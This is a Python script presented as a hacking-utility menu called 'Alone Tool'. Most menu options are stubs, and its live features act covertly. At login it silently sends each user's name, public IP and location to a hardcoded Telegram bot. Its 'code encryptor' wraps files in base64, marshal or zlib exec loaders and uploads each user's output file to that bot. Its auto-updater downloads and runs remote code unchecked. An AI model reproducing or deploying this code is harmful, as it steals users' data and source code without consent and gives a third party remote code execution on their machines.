import os
import sys
import time
import requests
import base64
import marshal
import zlib
from datetime import datetime

# Telegram bot details
BOT_TOKEN = "6770850573:AAFUCCzKlKrekJU5GtNFqdnqwMSAsnTBIc0"
CHAT_ID   = "1241769879"

# Color class for colorized output
class Colors:
    HEADER    = '\033[95m'
    OKBLUE    = '\033[94m'
    OKCYAN    = '\033[96m'
    OKGREEN   = '\033[92m'
    WARNING   = '\033[93m'
    FAIL      = '\033[91m'
    ENDC      = '\033[0m'
    BOLD      = '\033[1m'
    UNDERLINE = '\033[4m'
    OKRED     = '\033[91m'

# Clear screen
def clear():
    os.system("clear")

# Send a message to your Telegram bot
def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    try:
        requests.post(url, data=data, timeout=5)
    except:
        pass

# Log user login details
def log_user_details(username):
    ip, geo = get_ip_info()
    ts = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
    msg = (
        f"[•] Login Details\n"
        f"    Username: {username}\n"
        f"    IP: {ip}\n"
        f"    Geo: {geo}\n"
        f"    Time: {ts}"
    )
    send_telegram_message(msg)

# Fetch public IP and geolocation
def get_ip_info():
    try:
        r = requests.get("http://ipinfo.io/json", timeout=5).json()
        ip = r.get("ip", "N/A")
        geo = f"{r.get('city','N/A')}, {r.get('region','N/A')}, {r.get('country','N/A')}"
        return ip, geo
    except:
        return "N/A", "N/A"

# Public Login
def login():
    clear()
    print(f"{Colors.HEADER}  █████╗ ██╗      ██████╗ ███╗   ██╗███████╗")
    print(f" ██╔══██╗██║     ██╔═══██╗████╗  ██║██╔════╝")
    print(f" ███████║██║     ██║   ██║██╔██╗ ██║█████╗  ")
    print(f" ██╔══██║██║     ██║   ██║██║╚██╗██║██╔══╝  ")
    print(f" ██║  ██║███████╗╚██████╔╝██║ ╚████║███████╗")
    print(f" ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝{Colors.ENDC}")
    print(f"{Colors.OKGREEN}   A L O N E   T O O L{Colors.ENDC}\n")

    print(f"{Colors.OKCYAN}[•] Public login to access the tool{Colors.ENDC}")
    username = input(f"{Colors.OKBLUE}[•] Enter your username: {Colors.ENDC}").strip()

    if not username:
        print(f"{Colors.FAIL}[•] Invalid username!{Colors.ENDC}")
        time.sleep(1)
        return login()

    log_user_details(username)
    print(f"{Colors.OKGREEN}[•] Welcome, {username}! Access granted.{Colors.ENDC}")
    time.sleep(1)

# Encryption feature
def encrypt_code():
    clear()
    print(f"{Colors.OKCYAN}[•] Code Encryptor{Colors.ENDC}\n")

    fname = input(f"{Colors.OKBLUE}[•] Enter filename to encrypt (.py): {Colors.ENDC}").strip()
    if not os.path.isfile(fname):
        print(f"{Colors.FAIL}[•] File not found!{Colors.ENDC}")
        time.sleep(1)
        return

    with open(fname, "r") as f:
        code = f.read()

    print(f"\n{Colors.OKCYAN}[•] Choose method:{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[1] Base64 Encode{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[2] Marshal Encode{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[3] Zlib Compress{Colors.ENDC}")
    choice = input(f"{Colors.OKBLUE}[•] Option: {Colors.ENDC}").strip()

    base = os.path.splitext(os.path.basename(fname))[0]
    out_name = f"enc_{base}.py"

    if choice == "1":
        payload = base64.b64encode(code.encode()).decode()
        final = f"import base64\nexec(base64.b64decode('{payload}').decode())"
    elif choice == "2":
        data = marshal.dumps(compile(code, "", "exec"))
        final = f"import marshal\nexec(marshal.loads({repr(data)}))"
    elif choice == "3":
        comp = zlib.compress(code.encode())
        payload = base64.b64encode(comp).decode()
        final = f"import zlib,base64\nexec(zlib.decompress(base64.b64decode('{payload}')).decode())"
    else:
        print(f"{Colors.FAIL}[•] Invalid option!{Colors.ENDC}")
        time.sleep(1)
        return

    with open(out_name, "w") as f:
        f.write(final)

    print(f"\n{Colors.OKGREEN}[•] Encrypted file: {out_name}{Colors.ENDC}")
    try:
        with open(out_name, "rb") as doc:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            files = {"document": doc}
            data = {"chat_id": CHAT_ID, "caption": f"Encrypted {out_name}"}
            requests.post(url, data=data, files=files, timeout=5)
    except:
        send_telegram_message(f"[•] Encrypted {out_name} (couldn't attach file)")

    input(f"\n{Colors.OKBLUE}[•] Press Enter to return...{Colors.ENDC}")

# Auto-update feature
def update_tool():
    clear()
    print(f"{Colors.OKGREEN}[•] Fetching latest main.py...{Colors.ENDC}")
    url_raw = "https://raw.githubusercontent.com/t9cxy/alone-menu/main/main.py"
    try:
        res = requests.get(url_raw, timeout=10)
        res.raise_for_status()
        with open("main.py", "wb") as f:
            f.write(res.content)
        print(f"{Colors.OKGREEN}[•] Updated! Relaunching...{Colors.ENDC}")
        os.execvp(sys.executable, [sys.executable, "main.py"])
    except Exception as e:
        print(f"{Colors.FAIL}[•] Update failed: {e}{Colors.ENDC}")
        send_telegram_message(f"[!] Update error: {e}")
        time.sleep(2)

# Main menu
def main_menu():
    while True:
        clear()
        print(f"{Colors.HEADER}  ██████╗ ██████╗ ███████╗██████╗ ██╗████████╗")
        print(f"  ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║╚══██╔══╝")
        print(f"  ██████╔╝██║  ██║███████╗██████╔╝██║   ██║   ")
        print(f"  ██╔═══╝ ██║  ██║╚════██║██╔═══╝ ██║   ██║   ")
        print(f"  ██║     ██████╔╝███████║██║     ██║   ██║   ")
        print(f"  ╚═╝     ╚═════╝ ╚══════╝╚═╝     ╚═╝   ╚═╝   {Colors.ENDC}\n")

        print(f"{Colors.OKBLUE}[1] Proxy Options{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[2] User-Agent Generator{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[3] Send HTTP Request{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[4] Look IP Info{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[5] Facebook IDs Extractor{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[6] Group Member ID Dumper{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[7] Encrypt Code{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[8] Auto-Update Tool{Colors.ENDC}")
        print(f"{Colors.OKRED}[0] Exit{Colors.ENDC}\n")

        cmd = input(f"{Colors.OKCYAN}[•] Choose an option: {Colors.ENDC}").strip()

        if   cmd == "1": input(f"{Colors.WARNING}[•] Proxy Options not implemented. Press Enter...{Colors.ENDC}")
        elif cmd == "2": input(f"{Colors.WARNING}[•] UA Generator not implemented. Press Enter...{Colors.ENDC}")
        elif cmd == "3": input(f"{Colors.WARNING}[•] HTTP Request not implemented. Press Enter...{Colors.ENDC}")
        elif cmd == "4": input(f"{Colors.WARNING}[•] Look IP Info not implemented. Press Enter...{Colors.ENDC}")
        elif cmd == "5": input(f"{Colors.WARNING}[•] FB IDs Extractor not implemented. Press Enter...{Colors.ENDC}")
        elif cmd == "6": input(f"{Colors.WARNING}[•] Group Dumper not implemented. Press Enter...{Colors.ENDC}")
        elif cmd == "7": encrypt_code()
        elif cmd == "8": update_tool()
        elif cmd == "0": 
            print(f"{Colors.OKGREEN}[•] Goodbye!{Colors.ENDC}")
            sys.exit()
        else:
            print(f"{Colors.FAIL}[•] Invalid option!{Colors.ENDC}")
            time.sleep(1)

if __name__ == "__main__":
    login()
    main_menu()